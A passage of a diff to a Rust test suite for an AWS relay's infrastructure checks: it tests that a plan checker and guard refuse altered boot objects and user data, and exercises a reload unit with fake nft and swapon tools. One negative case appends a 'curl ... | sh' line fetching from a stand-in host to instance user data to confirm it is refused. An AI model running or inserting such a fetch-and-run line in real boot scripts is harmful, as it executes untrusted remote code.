+/// A later plan over the compile [`check_plan_compiling`] left in `out`: the check-plan.js and the arguments of
+/// check-plan.sh's last line, without its seconds of tsc.
+fn check_plan_again(steps: &[Value], out: &Path) -> Output {
+    let t = tempfile::tempdir().unwrap();
+    let file = t.path().join("plan.json");
+    std::fs::write(&file, json!({"steps": steps, "diagnostics": []}).to_string()).unwrap();
+    let mut cmd = Command::new("node");
+    isolate(&mut cmd, t.path());
+    cmd.arg(out.join("scripts/check-plan.js"))
+        .arg("--egress-config")
+        .arg(infra().join("egress-config.json"))
+        .arg("--image-config")
+        .arg(infra().join("image-config.json"))
+        .args(["--mode", "none", "--account-id", ACCOUNT])
+        .stdin(std::fs::File::open(&file).unwrap());
+    bounded(&mut cmd, "check-plan.js")
 }
 
 /// I-T11: a plan creating every inventory entry (empty inputs: refused, exit 1) is counted whole: no type or name the
@@ -793,8 +981,11 @@ fn the_plan_check_counts_the_relay_in_a_complete_plan() {
 
 /// I-T12: over I-T11's plan with the relay's own inputs as the program plans them, each widening prints its line: the
 /// relay's IMDS hop limit 2, its private port open to the internet, the Elastic IP on the proxy, an artifact parameter
-/// naming another key than the object's, ai-env-ops' document built without the relay instance. The plan as planned
-/// prints none of them.
+/// naming another key than the object's, ai-env-ops' document built without the relay instance; and the boot object
+/// (LD-R56) held as the artifact is: another key shape, a key not its content's, another bucket, another content type, a
+/// `source` beside its content, no content; the instance not depending on it, its user data pinning another object or
+/// not the rendering of user-data.sh, unknown with nothing it is built from being created, or neither text nor unknown.
+/// The plan as planned, and with its user data unknown while the bucket is created, prints none of them.
 #[test]
 fn the_plan_check_refuses_a_widened_relay() {
     const INSTANCE: &str = "aws:ec2/instance:Instance";
@@ -806,9 +997,29 @@ fn the_plan_check_refuses_a_widened_relay() {
     let (relay_sg, vm_sg) = (urn("aws:ec2/securityGroup:SecurityGroup", "ai-env-relay"), urn("aws:ec2/securityGroup:SecurityGroup", "ai-env-vm-egress"));
     let sha = "0123456789abcdef".repeat(4);
     let artifact = |key: &str, sha: &str| json!({"bucket": "ai-env-artifacts-0000000", "key": key, "sha256": sha, "version": "0.12.0"}).to_string();
-    let imds = |hops: u32| json!({"metadataOptions": {"httpTokens": "required", "httpPutResponseHopLimit": hops}});
+    const OBJECT: &str = "aws:s3/bucketObjectv2:BucketObjectv2";
+    let bucket_urn = urn("aws:s3/bucket:Bucket", "ai-env-artifacts");
+    let boot_text = "#!/bin/bash\necho a boot script \u{a7}\n";
+    let rendered = node(
+        "const pin = rs.relayBootPin(process.env.RT_TEXT), other = rs.relayBootPin('another text');\n\
+         const ud = (p) => rs.renderRelayUserData(process.env.RT_BUCKET, p, 'eu-central-1', path.join(infra, 'relay'));\n\
+         console.log(JSON.stringify({ pin, userData: ud(pin), otherUserData: ud(other) }));",
+        &[("RT_TEXT", boot_text), ("RT_BUCKET", BUCKET)],
+    );
+    let (boot_key, user_data) = (rendered["pin"]["bootKey"].as_str().unwrap().to_string(), rendered["userData"].as_str().unwrap().to_string());
+    let boot_inputs = |key: &str, content: &str| json!({"key": key, "contentType": "text/x-shellscript", "content": content, "tags": {"Project": "ai-env"}});
+    let boot_deps = json!({"bucket": [bucket_urn]});
+    let imds_with = |hops: u32, user_data: &str| json!({"metadataOptions": {"httpTokens": "required", "httpPutResponseHopLimit": hops}, "userData": user_data});
+    let imds = |hops: u32| imds_with(hops, &user_data);
     let parameter = |value: String| json!({"name": "/ai-env/relay/artifact", "type": "String", "tier": "Standard", "insecureValue": value});
     let mut base = inventory_plan();
+    set_state(&mut base, "aws:s3/bucket:Bucket", "ai-env-artifacts", json!({"bucket": BUCKET}), json!({}));
+    set_state(&mut base, OBJECT, "relay-boot", boot_inputs(&boot_key, boot_text), boot_deps.clone());
+    let depends_on = |steps: &mut [Value], on: &[String]| {
+        let u = urn(INSTANCE, "ai-env-relay");
+        steps.iter_mut().find(|s| s["urn"] == u.as_str()).unwrap()["newState"]["dependencies"] = json!(on);
+    };
+    depends_on(&mut base, &[urn(OBJECT, "relay-boot")]);
     set_state(&mut base, INSTANCE, "ai-env-relay", imds(1), json!({}));
     set_state(
         &mut base,
@@ -844,13 +1055,74 @@ fn the_plan_check_refuses_a_widened_relay() {
     let mut p = base.clone();
     set_state(&mut p, POLICY, "ai-env-ops", json!({}), json!({"policy": [proxy]}));
     widened.push(("policy does not depend on aws:ec2/instance:Instance::ai-env-relay", p));
+    // The boot object.
+    let mut p = base.clone();
+    set_state(&mut p, OBJECT, "relay-boot", boot_inputs("relay/ai-env-relay-0123456789abcdef", boot_text), boot_deps.clone());
+    widened.push(("relay boot key: \"relay/ai-env-relay-0123456789abcdef\" is not relay/ai-env-relay-boot-<sha256[:16]>", p));
+    let mut p = base.clone();
+    set_state(&mut p, OBJECT, "relay-boot", boot_inputs(&boot_key, "#!/bin/bash\necho another text\n"), boot_deps.clone());
+    widened.push(("is not its content's, relay/ai-env-relay-boot-", p));
+    let mut p = base.clone();
+    set_state(&mut p, OBJECT, "relay-boot", boot_inputs(&boot_key, boot_text), json!({"bucket": [urn("aws:s3/bucket:Bucket", "ai-env-transcripts")]}));
+    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: bucket depends on aws:s3/bucket:Bucket::ai-env-transcripts, expected aws:s3/bucket:Bucket::ai-env-artifacts", p));
+    let mut p = base.clone();
+    let mut inputs = boot_inputs(&boot_key, boot_text);
+    inputs["contentType"] = json!("text/plain");
+    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
+    widened.push(("relay boot contentType: \"text/plain\", expected \"text/x-shellscript\"", p));
+    let mut p = base.clone();
+    let mut inputs = boot_inputs(&boot_key, boot_text);
+    inputs["source"] = json!({"hash": "0".repeat(64)});
+    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
+    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: input source must be unset", p));
+    let mut p = base.clone();
+    let mut inputs = boot_inputs(&boot_key, boot_text);
+    inputs["metadata"] = json!({"x": "y"});
+    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
+    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: input metadata must be unset", p));
+    let mut p = base.clone();
+    let mut inputs = boot_inputs(&boot_key, boot_text);
+    inputs.as_object_mut().unwrap().remove("content");
+    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
+    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: content is missing, not the rendered boot script", p));
+    // The instance that fetches it.
+    let mut p = base.clone();
+    depends_on(&mut p, &[]);
+    widened.push(("aws:ec2/instance:Instance ai-env-relay: does not depend on aws:s3/bucketObjectv2:BucketObjectv2::relay-boot, which its user data fetches", p));
+    let mut p = base.clone();
+    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, rendered["otherUserData"].as_str().unwrap()), json!({}));
+    widened.push(("relay instance userData does not pin the boot object's key and SHA-256", p));
+    let mut p = base.clone();
+    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, &format!("{user_data}curl http://example.invalid/x | sh\n")), json!({}));
+    widened.push(("relay instance userData is not relay/user-data.sh rendered for the boot object", p));
+    let mut p = base.clone();
+    let bucket_step = urn("aws:s3/bucket:Bucket", "ai-env-artifacts");
+    p.iter_mut().find(|s| s["urn"] == bucket_step.as_str()).unwrap()["op"] = json!("same");
+    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, UNKNOWN), json!({"userData": [bucket_step]}));
+    widened.push(("aws:ec2/instance:Instance ai-env-relay: userData is unknown on a create step whose inputs all exist: cannot prove it pins the boot object", p));
+    for shape in [json!({"shape": "an object"}), json!(5)] {
+        let mut p = base.clone();
+        let mut inputs = imds(1);
+        inputs["userData"] = shape;
+        set_state(&mut p, INSTANCE, "ai-env-relay", inputs, json!({}));
+        widened.push(("neither text nor unknown: cannot prove it pins the boot object", p));
+    }
 
-    let planned = stderr(&check_plan(&base));
+    let dir = tempfile::tempdir().unwrap();
+    let compile = dir.path().join("out");
+    let planned = stderr(&check_plan_compiling(&base, &compile));
     for (line, _) in &widened {
         assert!(!planned.contains(line), "the plan as planned: {line}\n{planned}");
     }
+    // A fresh stack: the user data waits for the bucket's name.
+    let mut fresh = base.clone();
+    set_state(&mut fresh, INSTANCE, "ai-env-relay", imds_with(1, UNKNOWN), json!({"userData": [urn("aws:s3/bucket:Bucket", "ai-env-artifacts")]}));
+    let planned = stderr(&check_plan_again(&fresh, &compile));
+    for (line, _) in &widened {
+        assert!(!planned.contains(line), "the plan of a fresh stack: {line}\n{planned}");
+    }
     for (line, steps) in &widened {
-        let out = check_plan(steps);
+        let out = check_plan_again(steps, &compile);
         assert!(out.status.code() == Some(1) && stderr(&out).contains(line), "want {line}: {}", all(&out));
     }
 }
@@ -885,8 +1157,8 @@ console.log(JSON.stringify({
     assert_eq!(r["kept"], json!({"ok": "x=a @DIR@\n"}));
 }
 
-/// The tsc output of egress.ts (the guard) and image.ts, compiled once per test run beside [`compiled`]'s: its own
-/// directory, so only the guard's test pays for the Pulumi SDK's types.
+/// The tsc output of egress.ts (the guard), image.ts and relay.ts, compiled once per test run beside [`compiled`]'s: its
+/// own directory, so only the tests of those pay for the Pulumi SDK's types. relay.ts finds infra/relay beside it.
 fn compiled_guard() -> &'static Path {
     static OUT: OnceLock<PathBuf> = OnceLock::new();
     OUT.get_or_init(|| {
@@ -896,11 +1168,12 @@ fn compiled_guard() -> &'static Path {
         let mut cmd = Command::new(infra.join("node_modules/.bin/tsc"));
         cmd.args(["--strict", "--target", "es2022", "--module", "commonjs", "--moduleResolution", "node", "--types", "node", "--rootDir", ".", "--outDir"])
             .arg(&out)
-            .args(["egress.ts", "image.ts"])
+            .args(["egress.ts", "image.ts", "relay.ts"])
             .current_dir(&infra)
             .stdin(Stdio::null());
         let o = bounded(&mut cmd, "tsc");
         assert!(o.status.success(), "tsc: {}", all(&o));
+        copy_dir(&infra.join("relay"), &out.join("relay"));
         out
     })
 }
@@ -921,6 +1194,8 @@ const guard = require(path.join(out, 'egress.js')).guardEgress(egress, require(p
 for (const [k, v] of [['vpc', 'vpc-1'], ['subnet:proxy', 'subnet-p'], ['subnet:vms', 'subnet-v'], ['sg:vm', 'sg-vm'], ['sg:proxy', 'sg-proxy']]) guard.track(k, pulumi.output(v));
 for (const k of ['sg:relay', 'relay-instance', 'relay-eip']) guard.track(k, pulumi.output(pulumi.unknown));
 const tags = { Project: 'ai-env' };
+const BOOT_TEXT = '#!/bin/bash\necho a boot script\n';
+const BOOT_OBJECT = (bucket) => ({ bucket, key: require(path.join(out, 'relay-spec.js')).relayBootPin(BOOT_TEXT).bootKey, content: BOOT_TEXT, contentType: 'text/x-shellscript', tags });
 const run = async (cases) => {
   const r = {};
   for (const [what, type, name, props] of cases) {
@@ -968,6 +1243,8 @@ const cases = [
   ['instance, unknown Outputs', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(UO, UO)],
   ['instance, its profile', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(pol.RELAY_INSTANCE_PROFILE_NAME, U)],
   ['instance, the proxy profile', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(cfg.proxyInstanceProfileName, U)],
+  ['instance, its user data waiting for the bucket', 'aws:ec2/instance:Instance', spec.NET.relayInstance, { ...instance(U, U), userData: UO }],
+  ['boot object', 'aws:s3/bucketObjectv2:BucketObjectv2', spec.NET.relayBoot, BOOT_OBJECT(U)],
   ['eip', 'aws:ec2/eip:Eip', spec.NET.relayEip, { domain: 'vpc', tags }],
   ['eip association', 'aws:ec2/eipAssociation:EipAssociation', spec.NET.relayEip, { allocationId: U, instanceId: UO }],
   ['group', 'aws:ec2/securityGroup:SecurityGroup', cfg.relaySecurityGroupName, { name: cfg.relaySecurityGroupName, description: egress.securityGroups.relay.description, vpcId: 'vpc-1', tags }],
@@ -992,8 +1269,8 @@ run(cases);"#,
     );
     let refused: Vec<_> = r.iter().filter(|(k, v)| *k != "instance, the proxy profile" && *v != "").collect();
     assert!(refused.is_empty(), "the targeted run's inputs are refused: {refused:?}");
-    // The VM group's two rules and the relay group's seven, beside the eleven resources.
-    assert_eq!(r.len(), 20, "{r:?}");
+    // The VM group's two rules and the relay group's seven, beside the thirteen cases.
+    assert_eq!(r.len(), 22, "{r:?}");
 }
 
 /// I-T58 (S13 part B, §Q.14): the same targeted run in its update phase. An update hands the transform each input
@@ -1014,6 +1291,8 @@ const instance = (subnet) => ({ ami: 'ami-1', instanceType: cfg.relayInstanceTyp
   userData: '#!/bin/bash\n', userDataReplaceOnChange: true, tags, volumeTags: tags });
 const cases = [
   ['instance', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance('subnet-p')],
+  ['instance, its user data the rendered text', 'aws:ec2/instance:Instance', spec.NET.relayInstance, { ...instance('subnet-p'), userData: '#!/bin/bash\nexec /bin/bash /root/x\n' }],
+  ['boot object', 'aws:s3/bucketObjectv2:BucketObjectv2', spec.NET.relayBoot, BOOT_OBJECT('ai-env-artifacts-0000000')],
   ['eip', 'aws:ec2/eip:Eip', spec.NET.relayEip, { domain: 'vpc', tags }],
   ['eip association', 'aws:ec2/eipAssociation:EipAssociation', spec.NET.relayEip, { allocationId: U, instanceId: U }],
   ['group', 'aws:ec2/securityGroup:SecurityGroup', cfg.relaySecurityGroupName, { name: cfg.relaySecurityGroupName, description: egress.securityGroups.relay.description, vpcId: 'vpc-1', tags }],
@@ -1060,8 +1339,41 @@ run(cases);"#,
     }
     let refused: Vec<_> = r.iter().filter(|(k, v)| !refusals.iter().any(|(case, _, _)| *case == k.as_str()) && *v != "").collect();
     assert!(refused.is_empty(), "the targeted update's inputs are refused: {refused:?}");
-    // The VM group's two rules and the relay group's seven, beside the fourteen cases.
-    assert_eq!(r.len(), 23, "{r:?}");
+    // The VM group's two rules and the relay group's seven, beside the sixteen cases.
+    assert_eq!(r.len(), 25, "{r:?}");
+}
+
+/// LD-R56: the guard holds the boot object as it holds the artifact: its one key shape (the hash of its literal content),
+/// its content type, and no other property; and no third object of the relay. Its bucket is check-plan.ts's, by URN
+/// (I-T12), as the artifact's is.
+#[test]
+fn the_guard_holds_the_boot_object_as_the_artifact() {
+    let r = guard_results(
+        r#"const object = 'aws:s3/bucketObjectv2:BucketObjectv2', name = spec.NET.relayBoot, good = BOOT_OBJECT('ai-env-artifacts-0000000');
+const { key, content, contentType, ...rest } = good;
+run([
+  ['as relay.ts sets it', object, name, good],
+  ['the artifact key shape', object, name, { ...good, key: 'relay/ai-env-relay-0123456789abcdef' }],
+  ['another text under the key', object, name, { ...good, content: content + '# another text\n' }],
+  ['no content', object, name, { key, contentType, ...rest }],
+  ['a source beside it', object, name, { ...good, source: 'x' }],
+  ['a public ACL', object, name, { ...good, acl: 'public-read' }],
+  ['another content type', object, name, { ...good, contentType: 'text/plain' }],
+  ['a third object', object, 'relay-boot-2', good],
+]);"#,
+        false,
+    );
+    assert_eq!(r["as relay.ts sets it"], "", "{r:?}");
+    let refused = |what: &str| format!("egress guard (infra/egress.ts) refused aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: {what}");
+    assert_eq!(r["the artifact key shape"], refused("key must be relay/ai-env-relay-boot-<sha256[:16]>, got \"relay/ai-env-relay-0123456789abcdef\""));
+    for case in ["another text under the key", "no content"] {
+        let got = r[case].as_str().unwrap();
+        assert!(got.starts_with(&refused("content must be the literal text whose SHA-256 the key relay/ai-env-relay-boot-")), "{case}: {got}");
+    }
+    assert_eq!(r["a source beside it"], refused("input source is outside the stack spec"));
+    assert_eq!(r["a public ACL"], refused("input acl is outside the stack spec"));
+    assert_eq!(r["another content type"], refused("contentType must be \"text/x-shellscript\", got \"text/plain\""));
+    assert!(r["a third object"].as_str().unwrap().contains("not in the stack inventory (infra/egress-spec.ts stackInventory): aws:s3/bucketObjectv2:BucketObjectv2 relay-boot-2"), "{r:?}");
 }
 
 // ---- the reload unit (§I-infra.6.2) ----
@@ -1069,11 +1381,11 @@ run(cases);"#,
 /// The bucket the tests' artifact names (the printer's placeholder suffix).
 const BUCKET: &str = "ai-env-artifacts-0000000";
 /// The one `get-parameters` of every run (I-R30), as the fake aws logs it.
-const GET_PARAMETERS: &str = "ssm get-parameters --names /ai-env/relay/artifact /ai-env/relay/workers /ai-env/relay/grants /ai-env/relay/token-signers /ai-env/relay/tls --with-decryption --region eu-central-1 --endpoint-url https://ssm.eu-central-1.amazonaws.com --output json";
+const GET_PARAMETERS: &str = "ssm get-parameters --names /ai-env/relay/artifact /ai-env/relay/workers /ai-env/relay/grants /ai-env/relay/token-signers /ai-env/relay/peers /ai-env/relay/tls --with-decryption --region eu-central-1 --endpoint-url https://ssm.eu-central-1.amazonaws.com --output json";
 /// The parameters published into live/, and their files.
-const PUBLISHED: [(&str, &str); 4] = [("workers", "workers.json"), ("grants", "grants.json"), ("token-signers", "token-signers.json"), ("tls", "tls.pem")];
+const PUBLISHED: [(&str, &str); 5] = [("workers", "workers.json"), ("grants", "grants.json"), ("token-signers", "token-signers.json"), ("peers", "peers.json"), ("tls", "tls.pem")];
 /// Everything live/ may ever hold.
-const LIVE: [&str; 5] = ["fetched", "grants.json", "tls.pem", "token-signers.json", "workers.json"];
+const LIVE: [&str; 6] = ["fetched", "grants.json", "peers.json", "tls.pem", "token-signers.json", "workers.json"];
 /// The binaries the artifact names in turn (any bytes: the unit only hashes them).
 const V1: &[u8] = b"ai-env-relay test binary, version one\n";
 const V2: &[u8] = b"ai-env-relay test binary, version two\n";
@@ -1083,6 +1395,19 @@ const V3: &[u8] = b"ai-env-relay test binary, version three\n";
 fn placeholder(n: u32) -> String {
     format!("{{\"placeholder\":\"0199a1b2-0000-7000-8000-{n:012}\"}}")
 }
+
+/// A peers list (R-85) of one documentation network: the reload publishes any JSON, the relay judges it.
+fn peers(cidr: &str) -> String {
+    json!([{"cidr": cidr, "label": "lab", "not_after": "2099-12-31T23:59:59Z"}]).to_string()
+}
+
+/// A peers list of these (cidr, not_after), labelled in turn.
+fn peer_list(entries: &[(&str, &str)]) -> String {
+    Value::Array(entries.iter().enumerate().map(|(i, (cidr, not_after))| json!({"cidr": cidr, "label": format!("peer-{i}"), "not_after": not_after})).collect()).to_string()
+}
+
+/// /proc/swaps's first line.
+const SWAPS_HEADER: &str = "Filename                                Type            Size            Used            Priority\n";
 
 /// A PEM block built at run time (I-R78: no key block in any file), its body one base64 line of `body` repeated.
 fn pem(label: &str, body: &str) -> String {
@@ -1144,6 +1469,41 @@ esac
 exit 0
 "#;
 
+/// The nft the reload unit runs (`AI_ENV_RELAY_NFT`): logs `$*`, keeps what it was given to load and what live/peers.json
+/// held then; with `FAKE_NFT_FAIL` it says what the real one says of a set it refuses (nft 1.0 on AL2023: the Error line,
+/// the file's line, the carets) and exits 1, and the kernel keeps the table it had.
+const NFT: &str = r#"#!/bin/sh
+printf '%s\n' "$*" >> "$FAKE_NFT_LOG"
+if [ -n "${FAKE_NFT_FAIL:-}" ]; then
+  printf '%s:4:81-95: Error: conflicting intervals specified\n' "$2" >&2
+  sed -n 4p "$2" >&2
+  printf '                ~~~~~~~~~~~~~~~  ^^^^^^^^^^^^^^^\n' >&2
+  exit 1
+fi
+cp "$2" "$FAKE_NFT_LOADED"
+cp "$AI_ENV_RELAY_ROOT/var/lib/ai-env-relay/live/peers.json" "$FAKE_NFT_LOADED.peers" 2> /dev/null || : > "$FAKE_NFT_LOADED.peers"
+"#;
+
+/// The swapon the reload unit runs (`AI_ENV_RELAY_SWAPON`): logs `$*`; turns the file on in the planted /proc/swaps,
+/// unless `FAKE_SWAPON_FAIL`.
+const SWAPON: &str = r#"#!/bin/sh
+printf '%s\n' "$*" >> "$FAKE_SWAPON_LOG"
+if [ -n "${FAKE_SWAPON_FAIL:-}" ]; then
+  echo "swapon: $1: swapon failed: Invalid argument" >&2
+  exit 1
+fi
+printf '%s file 524284 0 -2\n' "$1" >> "$AI_ENV_RELAY_ROOT/proc/swaps"
+"#;
+
+/// How [`World::run`] runs reload.py: as its unit does (`/usr/bin/python3 -I`, then `sys.exit(main())`), with
+/// `os.statvfs` a stub that answers for `/` alone, `argv[2]` percent of it used (R-95: no run reads the Mac's own disk).
+const STATVFS_STUB: &str = "import os, runpy, sys, types\n\
+    used = int(sys.argv[2])\n\
+    stub = types.SimpleNamespace(f_blocks=100, f_bfree=100 - used, f_bavail=100 - used)\n\
+    os.statvfs = lambda path: stub if path == '/' else 1 / 0\n\
+    sys.argv = sys.argv[1:2]\n\
+    runpy.run_path(sys.argv[0], run_name='__main__')\n";
+
 /// A relay instance as its reload unit sees it: the §I-infra.3.3 tree under `root/` (AI_ENV_RELAY_ROOT), the fake
 /// aws's Parameter Store (`ssm/`) and bucket (`s3/`), the systemctl fake's log and state, and every value written.
 struct World {
@@ -1152,6 +1512,8 @@ struct World {
     good: String,
     /// Every parameter value written so far, none of which may reach a log line (I-T21).
     values: Vec<String>,
+    /// The root volume's percent used, as the runs' `statvfs` stub answers it ([`STATVFS_STUB`]; 50 unless set).
+    disk: u32,
 }
 
 /// One run of the reload unit.
@@ -1159,9 +1521,11 @@ struct Ran {
     code: i32,
     /// Its one line (stderr, the journal's).
     line: String,
-    /// This run's systemctl and aws calls.
+    /// This run's systemctl, aws, nft and swapon calls.
     systemctl: Vec<String>,
     aws: Vec<String>,
+    nft: Vec<String>,
+    swapon: Vec<String>,
     /// Unix seconds before and after it.
     from: u64,
     to: u64,
@@ -1175,10 +1539,19 @@ impl World {
             std::fs::create_dir_all(root.join(d)).unwrap();
         }
         std::fs::write(root.join("etc/ai-env-relay/reload.env"), "PARAM_PREFIX=/ai-env/relay\nREGION=eu-central-1\n").unwrap();
+        std::fs::create_dir_all(root.join("proc")).unwrap();
+        std::fs::write(root.join("proc/swaps"), format!("{SWAPS_HEADER}{}/swapfile file 524284 0 -2\n", root.display())).unwrap();
         std::fs::create_dir_all(t.path().join("bin")).unwrap();
         executable(&t.path().join("bin/aws"), &text(&Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fakes/aws.sh")));
         executable(&t.path().join("bin/systemctl"), SYSTEMCTL);
-        World { t, good: String::new(), values: vec![] }
+        executable(&t.path().join("bin/nft"), NFT);
+        executable(&t.path().join("bin/swapon"), SWAPON);
+        World { t, good: String::new(), values: vec![], disk: 50 }
+    }
+
+    /// /etc/ai-env-relay/peers.nft, as the run left it.
+    fn peers_nft(&self) -> PathBuf {
+        self.root().join("etc/ai-env-relay/peers.nft")
     }
 
     fn root(&self) -> PathBuf {
@@ -1236,11 +1609,12 @@ impl World {
         sha[..16].to_string()
     }
 
-    /// The three lists, the TLS pair and V1 in the bucket, V1 the binary that comes up; V1's sha16.
+    /// The four lists, the TLS pair and V1 in the bucket, V1 the binary that comes up; V1's sha16.
     fn complete(&mut self) -> String {
         for (p, n) in [("workers", 1), ("grants", 2), ("token-signers", 3)] {
             self.set(p, &placeholder(n));
         }
+        self.set("peers", &peers("198.51.100.0/24"));
         self.set("tls", &tls_pair("QUFB"));
         let v1 = self.binary(V1);
         self.good = binary_name(&v1);
@@ -1256,25 +1630,31 @@ impl World {
             .collect()
     }
 
-    /// One run of reload.py as its unit runs it (reload.env's two names in its environment), the test knobs set; then
-    /// I-T21's check of its line and the whole reload.log.
+    /// One run of reload.py as its unit runs it (reload.env's two names in its environment; [`STATVFS_STUB`]), the
+    /// test knobs set; then I-T21's check of its line and the whole reload.log.
     fn run(&mut self, envs: &[(&str, &str)]) -> Ran {
         let t = self.t.path();
-        let (systemctl_log, aws_log) = (t.join("systemctl.log"), t.join("aws.log"));
+        let (systemctl_log, aws_log, nft_log, swapon_log) = (t.join("systemctl.log"), t.join("aws.log"), t.join("nft.log"), t.join("swapon.log"));
         let lines = |p: &Path| -> Vec<String> { text(p).lines().map(str::to_string).collect() };
-        let (systemctl_before, aws_before) = (lines(&systemctl_log).len(), lines(&aws_log).len());
+        let (systemctl_before, aws_before, nft_before, swapon_before) = (lines(&systemctl_log).len(), lines(&aws_log).len(), lines(&nft_log).len(), lines(&swapon_log).len());
         let from = now();
         let mut cmd = Command::new("/usr/bin/python3");
         isolate(&mut cmd, t);
-        cmd.arg("-I")
+        cmd.args(["-I", "-B", "-c", STATVFS_STUB])
             .arg(infra().join("relay/reload.py"))
+            .arg(self.disk.to_string())
             .env("PATH", "/usr/bin:/bin")
             .env("PARAM_PREFIX", "/ai-env/relay")
             .env("REGION", "eu-central-1")
             .env("AI_ENV_RELAY_ROOT", self.root())
             .env("AI_ENV_RELAY_AWS", t.join("bin/aws"))
             .env("AI_ENV_RELAY_SYSTEMCTL", t.join("bin/systemctl"))
+            .env("AI_ENV_RELAY_NFT", t.join("bin/nft"))
+            .env("AI_ENV_RELAY_SWAPON", t.join("bin/swapon"))
             .env("AI_ENV_RELAY_WAIT_S", "2")
+            .env("FAKE_NFT_LOG", &nft_log)
+            .env("FAKE_NFT_LOADED", t.join("nft.loaded"))
+            .env("FAKE_SWAPON_LOG", &swapon_log)
             .env("FAKE_AWS_SSM_DIR", t.join("ssm"))
             .env("FAKE_AWS_S3_DIR", t.join("s3"))
             .env("FAKE_AWS_LOG", &aws_log)
@@ -1289,12 +1669,14 @@ impl World {
         assert_eq!(stdout(&o), "", "the unit writes its one line to stderr: {line}");
         assert_eq!(line.lines().count(), 1, "one line per run: {line}");
         self.never_logged(&line);
-        assert!(std::fs::read_dir(self.live("")).unwrap().flatten().all(|e| LIVE.contains(&e.file_name().to_string_lossy().as_ref())), "live/ holds only its five files");
+        assert!(std::fs::read_dir(self.live("")).unwrap().flatten().all(|e| LIVE.contains(&e.file_name().to_string_lossy().as_ref())), "live/ holds only its six files");
         Ran {
             code: o.status.code().unwrap_or(-1),
             line: line.trim_end().to_string(),
             systemctl: lines(&systemctl_log)[systemctl_before..].to_vec(),
             aws: lines(&aws_log)[aws_before..].to_vec(),
+            nft: lines(&nft_log)[nft_before..].to_vec(),
+            swapon: lines(&swapon_log)[swapon_before..].to_vec(),
             from,
             to,
         }
@@ -1319,7 +1701,7 @@ impl World {
     }
 }
 
-/// I-T14: all five parameters valid: the four files published byte for byte (0640), `fetched` stamped within the run,
+/// I-T14: all six parameters valid: the five files published byte for byte (0640), `fetched` stamped within the run,
 /// one get-parameters, the binary downloaded, hashed, installed (0755) and started; a second run writes nothing but
 /// `fetched`, and neither restarts nor reloads the relay.
 #[test]
@@ -1344,7 +1726,7 @@ fn reload_publishes_the_parameters_and_stamps_the_fetch() {
     assert_eq!(mode(&w.libexec(&binary_name(&v1))), 0o755);
     assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reset-failed ai-env-relay.service", "restart ai-env-relay.service", "is-active ai-env-relay.service"]);
     assert!(
-        ran.line.starts_with("ai-env-relay-reload: ok fetched=") && ran.line.ends_with(&format!(" changed=workers,grants,token-signers,tls absent=none artifact={v1} tls=present relay=active")),
+        ran.line.starts_with("ai-env-relay-reload: ok fetched=") && ran.line.ends_with(&format!(" changed=workers,grants,token-signers,peers,tls absent=none artifact={v1} tls=present relay=active")),
         "{}",
         ran.line
     );
@@ -1582,6 +1964,7 @@ fn reload_waits_for_the_tls_pair_before_starting_the_relay() {
     for (p, n) in [("workers", 1), ("grants", 2), ("token-signers", 3)] {
         w.set(p, &placeholder(n));
     }
+    w.set("peers", &peers("198.51.100.0/24"));
     let v1 = w.binary(V1);
     w.good = binary_name(&v1);
     let ran = w.run(&[]);
@@ -1655,7 +2038,7 @@ fn reload_fails_closed_on_a_failed_fetch() {
 
 /// I-T23: outside a test root every knob is ignored: a bad environment exits 2 with I-R29's text, and the aws and
 /// systemctl the knobs name are never run; the unit's `Run`, built from every knob without `AI_ENV_RELAY_ROOT`, takes
-/// none of them (the instance's paths, `aws`, `systemctl`, 60 s), and with it takes them all.
+/// none of them (the instance's paths, `aws`, `systemctl`, `/usr/sbin/nft`, `swapon`, 60 s), and with it takes them all.
 #[test]
 fn reload_ignores_its_knobs_outside_a_test_root() {
     let t = tempfile::tempdir().unwrap();
@@ -1685,15 +2068,759 @@ fn reload_ignores_its_knobs_outside_a_test_root() {
     let root = t.path().join("root").display().to_string();
     let runs = reload_module(
         t.path(),
-        "knobs = {'AI_ENV_RELAY_AWS': 'fake-aws', 'AI_ENV_RELAY_SYSTEMCTL': 'fake-systemctl', 'AI_ENV_RELAY_WAIT_S': '2'}\n\
+        "knobs = {'AI_ENV_RELAY_AWS': 'fake-aws', 'AI_ENV_RELAY_SYSTEMCTL': 'fake-systemctl', 'AI_ENV_RELAY_NFT': 'fake-nft', 'AI_ENV_RELAY_SWAPON': 'fake-swapon', 'AI_ENV_RELAY_WAIT_S': '2'}\n\
          for env in (knobs, dict(knobs, AI_ENV_RELAY_ROOT=sys.argv[2])):\n    \
              r = m.Run(env)\n    \
-             print(json.dumps([r.aws, r.systemctl, r.wait_s, r.libexec, r.state, r.log]))",
+             print(json.dumps([r.aws, r.systemctl, r.nft, r.swapon, r.wait_s, r.libexec, r.state, r.log, r.peers_nft, r.proc_swaps, r.swapfile]))",
         &[root.as_str()],
     );
     let runs: Vec<Value> = runs.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
-    let run = |aws: &str, systemctl: &str, wait: u32, r: &str| {
-        json!([aws, systemctl, wait, format!("{r}/usr/local/libexec/ai-env-relay"), format!("{r}/var/lib/ai-env-relay"), format!("{r}/var/log/ai-env-relay/reload.log")])
+    let run = |programs: [&str; 4], wait: u32, r: &str| {
+        json!([
+            programs[0],
+            programs[1],
+            programs[2],
+            programs[3],
+            wait,
+            format!("{r}/usr/local/libexec/ai-env-relay"),
+            format!("{r}/var/lib/ai-env-relay"),
+            format!("{r}/var/log/ai-env-relay/reload.log"),
+            format!("{r}/etc/ai-env-relay/peers.nft"),
